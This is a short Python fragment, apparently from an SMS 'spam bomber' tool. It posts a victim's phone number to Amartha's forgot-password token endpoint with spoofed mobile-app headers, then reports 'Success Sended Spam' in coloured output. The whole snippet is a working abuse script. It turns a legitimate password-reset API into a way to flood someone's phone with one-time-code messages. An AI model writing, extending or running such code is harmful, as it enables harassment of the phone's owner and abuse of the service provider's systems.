...
Amartha = requests.post("https://api.amartha.net/v1/api/register/requestForgotToken",headers={'Host':'api.amartha.net','X-App-Version':'108','Content-Type':'application/json','Content-Length':'24','Accept-Encoding':'gzip, deflate','User-Agent':'okhttp/4.9.0'},data=json.dumps({"phone":""+nomor})).text
respon = json.loads(Amartha)
if(respon['stat_code'] == "200"):
    print (f"{W}[{G}✓{W}][{G}Success{W}] Success Sended Spam")
elif(respon['stat_code'] == "400"):
    print (f"{W}[{R}x{W}][{R}{respon['stat_code']}{W}] {respon['stat_msg']}")